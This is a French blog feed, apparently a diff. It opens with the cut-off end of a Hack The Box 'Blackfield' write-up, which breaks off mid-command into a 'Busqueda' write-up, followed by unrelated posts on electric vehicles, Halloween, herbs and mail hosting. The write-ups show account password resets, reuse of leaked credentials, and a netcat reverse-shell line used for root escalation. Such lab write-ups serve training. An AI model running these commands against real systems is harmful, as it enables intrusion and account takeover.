+En moins de 3 minutes, le mot de passe du compte : `#00^BlackKnight`
+
+Connexion Evil-Winrm impossible avec le compte support.
+
+	kali@kali:~/blackfield$ evil-winrm -i 10.10.10.192 -u blackfield\support -p#00^BlackKnight
+
+
+	kali@kali:~/blackfield$ smbclient \\10.10.10.192\netlogon -U &quot;blackfield\support&quot; 
+
+En tant que support que puis-je faire ? Quels sont mes privilèges ? 
+
+	kali@kali:~$ rpcclient -U &quot;blackfield\support&quot; 10.10.10.192
+	Enter BLACKFIELD\support&#39;s password: 
+	
+	rpcclient $&gt; enumpriv
+	command not found: enumpriv
+	rpcclient $&gt; enumprivs
+	found 35 privileges
+	
+	SeCreateTokenPrivilege          0:2 (0x0:0x2)
+	SeAssignPrimaryTokenPrivilege           0:3 (0x0:0x3)
+	SeLockMemoryPrivilege           0:4 (0x0:0x4)
+	SeIncreaseQuotaPrivilege                0:5 (0x0:0x5)
+	SeMachineAccountPrivilege               0:6 (0x0:0x6)
+	SeTcbPrivilege          0:7 (0x0:0x7)
+	SeSecurityPrivilege             0:8 (0x0:0x8)
+	SeTakeOwnershipPrivilege                0:9 (0x0:0x9)
+	SeLoadDriverPrivilege           0:10 (0x0:0xa)
+	SeSystemProfilePrivilege                0:11 (0x0:0xb)
+	SeSystemtimePrivilege           0:12 (0x0:0xc)
+	SeProfileSingleProcessPrivilege                 0:13 (0x0:0xd)
+	SeIncreaseBasePriorityPrivilege                 0:14 (0x0:0xe)
+	SeCreatePagefilePrivilege               0:15 (0x0:0xf)
+	SeCreatePermanentPrivilege              0:16 (0x0:0x10)
+	SeBackupPrivilege               0:17 (0x0:0x11)
+	SeRestorePrivilege              0:18 (0x0:0x12)
+	SeShutdownPrivilege             0:19 (0x0:0x13)
+	SeDebugPrivilege                0:20 (0x0:0x14)
+	SeAuditPrivilege                0:21 (0x0:0x15)
+	SeSystemEnvironmentPrivilege            0:22 (0x0:0x16)
+	SeChangeNotifyPrivilege                 0:23 (0x0:0x17)
+	SeRemoteShutdownPrivilege               0:24 (0x0:0x18)
+	SeUndockPrivilege               0:25 (0x0:0x19)
+	SeSyncAgentPrivilege            0:26 (0x0:0x1a)
+	SeEnableDelegationPrivilege             0:27 (0x0:0x1b)
+	SeManageVolumePrivilege                 0:28 (0x0:0x1c)
+	SeImpersonatePrivilege          0:29 (0x0:0x1d)
+	SeCreateGlobalPrivilege                 0:30 (0x0:0x1e)
+	SeTrustedCredManAccessPrivilege                 0:31 (0x0:0x1f)
+	SeRelabelPrivilege              0:32 (0x0:0x20)
+	SeIncreaseWorkingSetPrivilege           0:33 (0x0:0x21)
+	SeTimeZonePrivilege             0:34 (0x0:0x22)
+	SeCreateSymbolicLinkPrivilege           0:35 (0x0:0x23)
+	SeDelegateSessionUserImpersonatePrivilege               0:36 (0x0:0x24)
+	rpcclient $&gt; 
+
+On remarque que l&#39;utilisateur dispose de privilèges importants, davantage que par défaut. Peut-il changer un mot de passe ? Comment  ? `https://malicious.link/post/2017/reset-ad-user-password-with-linux/`
+
+Je modifie le mot de passe du compte `audit2020`.
+
+	rpcclient $&gt; setuserinfo2 audit2020 23 &#39;@ud172020&#39;
+
+
+Le compte audit2020 est compromis ! Je peux maintenant accéder au contenu du dossier forensic. 
+
+
+	kali@kali:~$ smbclient \\10.10.10.192\forensic -U &quot;blackfield\audit2020&quot; 
+	Enter BLACKFIELD\audit2020&#39;s password: 
+	Try &quot;help&quot; to get a list of possible commands.
+	smb: \&gt; dir
+	  .                                   D        0  Sun Feb 23 08:03:16 2020
+	  ..                                  D        0  Sun Feb 23 08:03:16 2020
+	  commands_output                     D        0  Sun Feb 23 13:14:37 2020
+	  memory_analysis                     D        0  Thu May 28 16:28:33 2020
+	  tools                               D        0  Sun Feb 23 08:39:08 2020
+	
+		            7846143 blocks of size 4096. 3661533 blocks available
+	smb: \&gt; 
+
+De nouveaux fichiers, de nouvelles lectures :) Je télécharge tout.
+
+	smb: \&gt; cd commands_output\
+	smb: <item>
+<pubDate>2023-08-17T11:24:56Z 10:56:03 CET</pubDate>
+  <category>2023/08/17/4</category>
+  <title>htb Busqueda</title>
+  <link>http://3r1c.net/posts/2023-08-17-busqueda.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Résumé : l&#39;exploitation d&#39;une vulnérabilité de type injection de commandes permet d&#39;obtenir un accès non privilégié à la machine. On découvre des crédentiels dans la configuration git, qui nous permettent de nous connecter à gitea. De la lecture du code d&#39;un script nous déduisons la présence d&#39;une vulnérabilité introduite par l&#39;utilisation d&#39;un chemin relatif par ce script. Ce script peu sécurisé peut être utilisé en sudo, et nous permet d’exécuter du code à distance avec les privilèges root.
+
+## Enumeration
+
+Nmap permet d&#39;identifier un site sur le port 80 : http://searcher.htb/. 
+
+```
+$ nmap -sC -sV -vv 10.129.140.129
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-10 12:54 BST
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+Initiating Ping Scan at 12:54
+Scanning 10.129.140.129 [2 ports]
+Completed Ping Scan at 12:54, 0.09s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 12:54
+Completed Parallel DNS resolution of 1 host. at 12:54, 0.00s elapsed
+Initiating Connect Scan at 12:54
+Scanning 10.129.140.129 [1000 ports]
+Discovered open port 22/tcp on 10.129.140.129
+Discovered open port 80/tcp on 10.129.140.129
+Completed Connect Scan at 12:54, 1.33s elapsed (1000 total ports)
+Initiating Service scan at 12:54
+Scanning 2 services on 10.129.140.129
+Completed Service scan at 12:54, 6.18s elapsed (2 services on 1 host)
+NSE: Script scanning 10.129.140.129.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 2.56s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.34s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+Nmap scan report for 10.129.140.129
+Host is up, received syn-ack (0.086s latency).
+Scanned at 2023-08-10 12:54:47 BST for 11s
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
+|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
+80/tcp open  http    syn-ack Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://searcher.htb/
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 12:54
+Completed NSE at 12:54, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.83 seconds
+```
+
+Après modification du `/etc/hosts` j&#39;accède au site.
+
+```
+echo &quot;10.129.140.129 searcher.htb&quot; | sudo tee -a /etc/hosts
+```
+
+
+
+## Vulnérabilité du site
+
+Le site utilise l&#39;application &quot;Searchor 2.4.0&quot; selon une information affichée en bas de page. Une vulnérabilité et un exploit existent pour cette application. La vulnérabilité est due à une absence de vérification des entrées utilisateurs, qui permet une injection de commande.
+
+https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection
+
+## Exploitation
+
+Un netcat écoute les connexions entrantes sur ma machine attaquant.
+
+```
+$ nc -nlvp 9001
+```
+
+Et je lance l&#39;[exploit](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection).
+
+```
+$ ./exploit.sh searcher.htb 10.10.14.72 9001
+---[Reverse Shell Exploit for Searchor &lt;= 2.4.2 (2.4.0)]---
+[*] Input target is searcher.htb
+[*] Input attacker is 10.10.14.72:9001
+[*] Run the Reverse Shell... Press Ctrl+C after successful connection
+```
+
+J&#39;obtiens un shell non privilégié.
+
+```
+$ nc -nlvp 9001
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.129.140.129.
+Ncat: Connection from 10.129.140.129:35032.
+bash: cannot set terminal process group (1485): Inappropriate ioctl for device
+bash: no job control in this shell
+svc@busqueda:/var/www/app$
+```
+
+## Enumération
+
+J&#39;observe le contenu du dossier en cours. Je découvre git et une configuration qui contient un mot de passe.
+
+```
+svc@busqueda:/var/www/app$ ls -lha
+ls -lha
+total 20K
+drwxr-xr-x 4 www-data www-data 4.0K Apr  3 14:32 .
+drwxr-xr-x 4 root     root     4.0K Apr  4 16:02 ..
+-rw-r--r-- 1 www-data www-data 1.1K Dec  1  2022 app.py
+drwxr-xr-x 8 www-data www-data 4.0K Aug 10 11:44 .git
+drwxr-xr-x 2 www-data www-data 4.0K Dec  1  2022 templates
+svc@busqueda:/var/www/app$ ls -l .git	
+ls -l .git
+total 44
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches
+-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG
+-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config
+-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description
+-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks
+-rw-r--r-- 1 root     root      259 Apr  3 15:09 index
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info
+drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs
+drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects
+drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs
+
+svc@busqueda:/var/www/app$ cd .git
+cd .git
+svc@busqueda:/var/www/app/.git$ ls
+ls
+branches
+COMMIT_EDITMSG
+config
+description
+HEAD
+hooks
+index
+info
+logs
+objects
+refs
+
+svc@busqueda:/var/www/app/.git$ cat config
+cat config
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+[remote &quot;origin&quot;]
+	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[branch &quot;main&quot;]
+	remote = origin
+	merge = refs/heads/main
+```
+
+Notons qu&#39;il existe un autre domaine qui porte un gitea : http://gitea.searcher.htb/
+
+Je tente d&#39;utiliser le mot de passe comme mot de passe sudo.
+
+```
+svc@busqueda:/var/www/app/.git$ sudo -S -l
+sudo -S -l
+[sudo] password for svc: jh1usoih2bkjaspwe92
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+svc@busqueda:/var/www/app/.git$ 
+```
+
+Ce script system-checkup.py peut être utilisé par l&#39;utilisateur svc.
+
+```
+svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py /etc/passwd
+&lt;/python3 /opt/scripts/system-checkup.py /etc/passwd
+Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+```
+
+Il permet de lister le conteneurs.
+
+```
+svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+&lt;in/python3 /opt/scripts/system-checkup.py docker-ps
+CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   &quot;/usr/bin/entrypoint…&quot;   7 months ago   Up 47 minutes   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   gitea
+f84a6b33fb5a   mysql:8              &quot;docker-entrypoint.s…&quot;   7 months ago   Up 47 minutes   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_db
+```
+
+Et de lancer la commande [inspect](https://docs.docker.com/engine/reference/commandline/inspect/) de docker. Il faut passer en argument le format et l&#39;ID du conteneur à &quot;inspecter&quot;.
+
+On obtient le mot de passe de la BDD MySql du site.
+
+```
+svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &#39;{{ json .Config}}&#39; 960873171e2e
+&lt;.py docker-inspect &#39;{{ json .Config}}&#39; 960873171e2e
+{&quot;Hostname&quot;:&quot;960873171e2e&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:{&quot;22/tcp&quot;:{},&quot;3000/tcp&quot;:{}},&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;USER_UID=115&quot;,&quot;USER_GID=121&quot;,&quot;GITEA__database__DB_TYPE=mysql&quot;,&quot;GITEA__database__HOST=db:3306&quot;,&quot;GITEA__database__NAME=gitea&quot;,&quot;GITEA__database__USER=gitea&quot;,&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;USER=git&quot;,&quot;GITEA_CUSTOM=/data/gitea&quot;],&quot;Cmd&quot;:[&quot;/bin/s6-svscan&quot;,&quot;/etc/s6&quot;],&quot;Image&quot;:&quot;gitea/gitea:latest&quot;,&quot;Volumes&quot;:{&quot;/data&quot;:{},&quot;/etc/localtime&quot;:{},&quot;/etc/timezone&quot;:{}},&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;/usr/bin/entrypoint&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:{&quot;com.docker.compose.config-hash&quot;:&quot;e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;server&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;,&quot;maintainer&quot;:&quot;maintainers@gitea.io&quot;,&quot;org.opencontainers.image.created&quot;:&quot;2022-11-24T13:22:00Z&quot;,&quot;org.opencontainers.image.revision&quot;:&quot;9bccc60cf51f3b4070f5506b042a3d9a1442c73d&quot;,&quot;org.opencontainers.image.source&quot;:&quot;https://github.com/go-gitea/gitea.git&quot;,&quot;org.opencontainers.image.url&quot;:&quot;https://github.com/go-gitea/gitea&quot;}}
+```
+
+En utilisant `jq`, voici un affichage plus digeste de la partie intéressante.
+
+```
+...
+&quot;Env&quot;: [
+    &quot;USER_UID=115&quot;,
+    &quot;USER_GID=121&quot;,
+    &quot;GITEA__database__DB_TYPE=mysql&quot;,
+    &quot;GITEA__database__HOST=db:3306&quot;,
+    &quot;GITEA__database__NAME=gitea&quot;,
+    &quot;GITEA__database__USER=gitea&quot;,
+    &quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,
+    &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,
+    &quot;USER=git&quot;,
+    &quot;GITEA_CUSTOM=/data/gitea&quot;
+  ],
+...
+```
+
+Le mot de passe est réutilisé pour se connecter sur ce site gitea avec administrator / yuiu1hoiu4i5ho1uh.
+
+Dans gitea je peux maintant lire le contenant du script initial : `system-checkup.py`
+
+Je découvre grâce au code que l&#39;option full-checkup lance un script `./full-checkup.sh`. Il est donc théoriquement possible de créer un `full-checkup.sh` malicieux, et de l&#39;exécuter depuis n&#39;importe quelle location. En l&#39;occurrence depuis une location dans laquelle l&#39;utilisateur a les droits d&#39;écriture (/tmp par exemple). 
+
+```
+    elif action == &#39;full-checkup&#39;:
+        try:
+            arg_list = [&#39;./full-checkup.sh&#39;]
+            print(run_command(arg_list))
+            print(&#39;[+] Done!&#39;)
+```
+
+On peut insérer un reverse shell dans `/tmp/full-checkup.sh`.
+
+```
+echo -en &quot;#! /bin/bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.72 9002 &gt;/tmp/f&quot; &gt; /tmp/full-checkup.sh
+```
+
+Puis :
+
+```
+chmod +x /tmp/full-checkup.sh
+cd /tmp
+sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+```
+
+Sur notre machine attaquant, avec un netcat en écoute un reçoit la connexion entrante, en root.
+
+```
+$ nc -nlvp 9002
+```</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-08-17-busqueda.txt</guid>
+  </item>
+<item>
+<pubDate>2023-10-04 10:56:03 CET</pubDate>
+  <category>2023/10/04/3</category>
+  <title>Recommandations de recharge de véhicule électrique</title>
+  <link>http://3r1c.net/posts/2023-10-04-reco-recharge-vehicule-electrique.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>L&#39;objet de l&#39;article, est de noter mes quelques recommandations d&#39;usage de la
+batterie d&#39;un véhucule électrique afin de conserver un bon niveau de santé.
+
+- Recharger au max à 80%, sauf si on utilise les 20% de 80 à 100% dans les 24h
+- Ne pas stocker les derniers 20% plus de 24h.
+- Lorsque le véhicule ne bouge pas durablement, charger entre 55 et 70%.
+- Eviter</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-10-04-reco-recharge-vehicule-electrique.txt</guid>
+  </item>
+<item>
+<pubDate>2023-10-08 10:56:03 CET</pubDate>
+  <category>2023/10/08/7</category>
+  <title>Véhicule électrique : un véhicule vert ?</title>
+  <link>http://3r1c.net/posts/2023-10-08-vehicule-electrique-vert.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Tout d&#39;abord, je voudrais préciser que je suis utilisateur d&#39;un VE (véhicule
+électrique) depuis presque 2 ans. Je pense sincèrement que ce type de
+motorisation ne sauvera pas le monde. Bien qu&#39;il offre des avantages comme ne
+plus émettre de particules fines, le VE reste un moyen de transport qui
+nécessite des routes, des autoroutes, des parkings et tout cela continue à
+détruire la biodiversité. Le problème ne réside pas tellement dans la source
+d&#39;énergie (pétrole ou électrique), mais plutôt dans ce qu&#39;on fait de cette
+énergie. Alors évidemment on sait qu&#39;on va sauver des milliers de personnes
+lorsqu&#39;on émettra plus de particules fines, mais en attendant on continue à
+générer du co2, des batteries de 500kg, à raser les forêts : et on nous vend de
+la voiture &quot;verte&quot;.  Ne soyons pas dupe, les VE ne sont pas écologiques et
+aucun moyen de transport ne le sera jamais (hormis peut être le vélo). Après
+ces bonnes nouvelles je vous propose quelques reco pour le rechargement de
+votre VE :)</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-10-08-vehicule-electrique-vert.txt</guid>
+  </item>
+<item>
+<pubDate>2023-10-31 10:56:03 CET</pubDate>
+  <category>2023/10/31/2</category>
+  <title>Halloween petites infos</title>
+  <link>http://3r1c.net/posts/2023-10-31-halloween-cest-quoi.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Halloween semble se rattacher à de très anciens rites qu&#39;on célébrait le soir du
+31 octobre. Selon wikipedia il s&#39;agit d&#39;une fête traditionnelle païenne
+originaire des îles anglo-celtes. Nombreux prêtent à Halloween un héritage de la
+fête religieuse de Samhain (prononcer sahwin) qui était aussi célébrée le 31
+octobre par les Celtes. Samhain était en quelque sorte un nouvel an. Samhain est
+d&#39;ailleurs la fête majeure de l&#39;année pour toute Sorcière. Il marque la fin de
+l&#39;été et donc le passage à l&#39;hiver. La nature se meurt mais pas totalement,
+l&#39;hiver est le temp de la régénération et du renouvellement.
+
+Cette nuit du nouvel an celtique le monde des vivants et le monde des morts se
+rapprochent, la frontière devient si mince que les habitants de l&#39;autre monde
+viennent visiter les humains, et inversement. Les fantômes et autres esprits
+peuvent alors se promener parmi les vivants qui eux honorent leurs ancêtres.
+
+Les Sorcières profitent de Samhain pour se recueillir, en particulier en forêt.
+Elles tirent des enseignement de l&#39;année qui s&#39;est écoulée. La promenade en
+forêt permet de récolter des feuilles mortes ou autres cadeaux laisser par la
+nature. Ceux-ci servent de décors aux autels de rituels souvent présents chez
+les sorcières. 
+
+Le soir d&#39;halloween, lumières et bougies illuminent les abords des maisons pour
+guider les esprits en recherche de la chaleur d&#39;un foyer. Pour au contraire
+repousser les esprits indésirés de l&#39;autre monde, des protections sont mises en
+évidences : sel, runes, etc. Les créations effrayantes comme les citrouilles
+creusées font aussi parties des protections :) L&#39;autre grande fete annuelle se
+situe dans la nuit du 30 avril au 1er mai : le Walpurgis. On continue le
+célébrer dans certains pays, certaines régions. La nuit est passée à préparer
+des farces aux voisins qu&#39;ils ne découvriront qu&#39;au petit jour.  Mes sources
+sont wikipedia mais également d&#39;autres sites sur lesquels j&#39;ai glané ces
+quelques infos. Voilà c&#39;était la minute culturelle du mois :-))</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-10-31-halloween-cest-quoi.txt</guid>
+  </item>
+<item>
+<pubDate>2023-11-02 10:56:03 CET</pubDate>
+  <category>2023/11/02/4</category>
+  <title>Amulette de sommeil</title>
+  <link>http://3r1c.net/posts/2023-11-02-amulette-de-sommeil.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Pour les insomniaques, voici une amulette sous forme d&#39;un sachet (coton ou lin)
+à glisser sous l&#39;oreiller. Il est composé de plantes qui favorisent l&#39;apaisement
+physique et mental. Mettre tous les ingrédients dans le sachet :
+
+- 3g de fleurs de lavandes séchées
+- 3g de verveine séchée
+- 3g de romarin séché
+- 3g de thym séché
+- quelques fleurs de camomille romaine
+- 1 pincée de gros sel pour les plus superstitieux :)</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-11-02-amulette-de-sommeil.txt</guid>
+  </item>
+<item>
+<pubDate>2023-11-08 10:56:03 CET</pubDate>
+  <category>2023/11/08/3</category>
+  <title>Le monde de demain (3) - Sans transition</title>
+  <link>http://3r1c.net/posts/2023-11-08-le-monde-de-demain-3.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Ce billet fait partie d&#39;un essai que j&#39;ai nommé &quot;Le monde de demain&quot;.
+
+Sans transition
+===============
+
+Vers 2038 la prétendue transition écologique ne trompait plus personne. Le monde
+avait compris, mais bien trop tard, qu&#39;elle n&#39;existait pas. Remplacer les
+centrales à charbon par des éoliennes aura seulement permis de limiter les
+particules fines dans l&#39;air. On avait résolu le dernier de nos problèmes. De
+telles constructions en mer on continué à détruire la vie marine. A tel point
+que la pêche était devenue tout simplement sans résultat. On ne mange plus de
+poisson depuis. Même plus les poissons des lacs et des rivières puisqu&#39;ils sont
+pollués aux pesticides.  Ce qui est positif c&#39;est que nous n&#39;utilisons plus les
+pesticides nocifs car il s&#39;agissait de produits dérivé du pétrole, dont nous
+avons sucé la dernière goutte en 2055. La fin de l&#39;époque pétrolière a entraîné
+la mort de la plupart des commerces. En effet, le pétrole était très largement
+utilisé pour fabriquer des vêtements, des chaussures, tout les objets en
+plastique, des détergents, des huiles pour les moteurs, etc. Ce fût probablement
+le coup de grâce pour la croissance économique.  La production d&#39;énergie
+éolienne et nucléaire a probablement été ce qui a terminé de nous conduire dans
+le mûr.  Nous avons abandonné le gasoil pour le véhicule et les camions
+électriques, mais nous avons poursuivi la destruction des forêts pour construire
+des parkings et des immeubles, bouleversant ainsi les écosystèmes. Notre plus
+grande erreur fût de penser qu&#39;on pouvait continuer à vivre de la même manière,
+mais plus écologiquement. Non, nous aurions dû revoir profondément notre mode de
+vie.</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-11-08-le-monde-de-demain-3.txt</guid>
+  </item>
+<item>
+<pubDate>2023-11-09 10:56:03 CET</pubDate>
+  <category>2023/11/09/4</category>
+  <title>Véhicule électrique vert ? (2)</title>
+  <link>http://3r1c.net/posts/2023-11-09-vehicule-electrique-vert-2.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>J&#39;ai précédemment évoqué quelques pensées à propos des véhicules électriques et
+de leurs prétendues vertus écologiques. Oui vous savez ce char d&#39;environ 1 tonne
+embarquant 500 kg de batteries. Celles-ci sont constituées de métaux rares,
+souvent prélevés en Afrique. L&#39;exploitation des mines pour extraire ces métaux
+est une aberration écologique et humaine. En effet d&#39;une part l&#39;extraction
+nécessite une quantité d&#39;eau astronomique, une eau qui finira polluée (aux
+métaux), une eau qui va ruisseler dans les nappes et les polluer également et
+pour un long moment.
+D&#39;autre part les personnes qui travaillent dans ces mines subissent des effets
+néfastes sur leur santé. Je ne maîtrise pas bien ces effets mais
+envisageriez-vous d&#39;aller bosser là-bas pour y respirer des particules de métaux
+nocifs ? 
+Aurions nous seulement déplacer le problème ? Pire encore, nous l&#39;avons déplacé
+chez les autres.</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-11-09-vehicule-electrique-vert-2.txt</guid>
+  </item>
+<item>
+<pubDate>2023-12-02 10:56:03 CET</pubDate>
+  <category>2023/12/02/6</category>
+  <title>email auto hébergé</title>
+  <link>http://3r1c.net/posts/2023-11-10-email-auto-heberge.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Mise à jour - date d&#39;origine 2023-11-10
+
+# Note
+
+Ceci est largement inspiré de https://landchad.net/mail.
+
+# Intro
+
+Il s&#39;agit de documenter la mise en place d&#39;un auto hébergement de mails.
+Plusieurs options.
+
+- Option 1 : mail4one [1], un serveur smtp (réception) + pop
+  (consultation) pour un seul utilisateur. Livraison au format maildir.
+Notons que mail4one ne semble pas compatible avec tous les clients
+mails, cependants K9 et Thunderbird ont été testés.  Il n&#39;y a pas
+d&#39;envoi possible, en conséquence il faut utiliser un service tiers comme
+smtp2go [2]. C&#39;est une solution simple et rapide.  mail4one ne prévoit pas
+de check spf et dkim, donc ceci peut engendrer du spam dans vos
+courriers entrants. 
+- Option 2 : postfix (envoi et réception), avec livraison dans des
+  maildirs, sans possibilité de relever ces mails avec un client mail,
+sauf celui du serveur, mutt ou alpine par exemple. A distance il reste
+possible de relever le courrier via ssh.
+- Option 3 : postfix (envoi et réception) + dovecot (consultation imap)
+  avec authentification sasl.
+
+[1]: https://gitlab.com/balki/mail4one
+[2]: https://support.smtp2go.com/hc/en-gb/articles/223087947-Free-Plan
+
+# Préalable
+
+Première chose et dans tous les cas, il nous faut un enregistrement dns
+de type MX qui pointe vers notre serveur de mail, par exemple vers le
+nom mail.example.org.
+
+# Option 1 - mail4one
+
+La documentation mail4one [3] est très correcte. Elle permet de démarrer
+son propre serveur mail en quelques minutes. Je ne donne donc pas de
+détails ici.
+
+[3]: https://github.com/mail4one/mail4one/tree/main/deploy_configs
+
+# mutt pour utiliser smtp2go
+
+Configurer mutt pour pointer sur le dossiers /var/mails, et utiliser le
+relais smtp de smtp2go.
+```
+# Vim comme éditeur
+set editor = &quot;vim -c &#39;set tw=72&#39; -c &#39;set wrap&#39;&quot;
+set folder=&quot;/var/lib/mail4one/mails/all&quot;
+set mask=&quot;!^\.[^.]&quot;
+set mbox=&quot;/var/lib/mail4one/mails/all&quot;
+set record=&quot;+.Sent&quot;
+set postponed=&quot;+.Drafts&quot;
+set spoolfile=&quot;/var/lib/mail4one/mails/all&quot;
+# Adresse électronique de l&#39;expéditeur
+set from=&quot;Eric &lt;site@3r1c.net&gt;&quot;
+# Nom complet de l&#39;expéditeur
